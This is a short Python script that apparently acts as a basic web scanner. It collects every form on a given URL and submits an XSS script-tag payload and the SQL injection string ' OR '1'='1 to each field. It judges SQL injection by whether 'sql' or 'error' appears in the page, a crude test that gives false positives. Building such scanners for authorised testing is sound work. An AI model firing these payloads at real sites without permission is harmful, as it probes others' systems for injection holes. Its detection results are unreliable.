import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ------------------------ Extract Forms ------------------------
def get_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url).content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to load page: {e}")
        return []

# ------------------------ Extract Form Details ------------------------
def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").strip()
        method = form.attrs.get("method", "get").lower()
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        return details
    except Exception as e:
        print(Fore.RED + f"[!] Error extracting form details: {e}")
        return None

# ------------------------ Submit Form with Payload ------------------------
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details['action'])
    inputs = form_details['inputs']
    data = {}

    for input_field in inputs:
        if input_field['type'] != "submit":
            name = input_field['name']
            if name:
                data[name] = payload

    print(Fore.MAGENTA + f"\n[~] Submitting form to: {target_url}")
    print(f"Payload: {payload}")

    try:
        if form_details['method'] == 'post':
            response = requests.post(target_url, data=data)
        else:
            response = requests.get(target_url, params=data)
        return response
    except Exception as e:
        print(Fore.RED + f"[!] Error submitting form: {e}")
        return None

# ------------------------ Analyze Response for Vulnerabilities ------------------------
def analyze_response(response, payload):
    if payload in response.text:
        print(Fore.RED + "[!!!] Potential XSS Vulnerability Detected!")
    elif "sql" in response.text.lower() or "error" in response.text.lower():
        print(Fore.RED + "[!!!] Potential SQL Injection Detected!")
    else:
        print(Fore.GREEN + "[✓] No obvious vulnerabilities found.")

# ------------------------ Main Scanner Logic ------------------------
def scan_url_for_forms(url):
    print(Fore.CYAN + f"\n[+] Scanning: {url}")
    forms = get_forms(url)

    if not forms:
        print(Fore.YELLOW + "[!] No forms found on this page.")
        return

    print(Fore.GREEN + f"[✓] Found {len(forms)} form(s)\n")

    for i, form in enumerate(forms, start=1):
        form_details = get_form_details(form)
        print(f"--- Form #{i} ---")
        print(f"Action : {form_details['action']}")
        print(f"Method : {form_details['method']}")
        print("Inputs :")
        for input_field in form_details['inputs']:
            print(f" - {input_field['name']} ({input_field['type']})")
        print("-------------------------")

        # Payload Testing
        print(Fore.YELLOW + "[*] Testing for XSS...")
        response_xss = submit_form(form_details, url, "<script>alert('XSS')</script>")
        if response_xss:
            analyze_response(response_xss, "<script>alert('XSS')</script>")

        print(Fore.YELLOW + "[*] Testing for SQL Injection...")
        response_sqli = submit_form(form_details, url, "' OR '1'='1")
        if response_sqli:
            analyze_response(response_sqli, "' OR '1'='1")

# ------------------------ Entry Point ------------------------
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Fore.YELLOW + "Usage: python scanner.py <url>")
        sys.exit(1)

    target_url = sys.argv[1]
    scan_url_for_forms(target_url)
    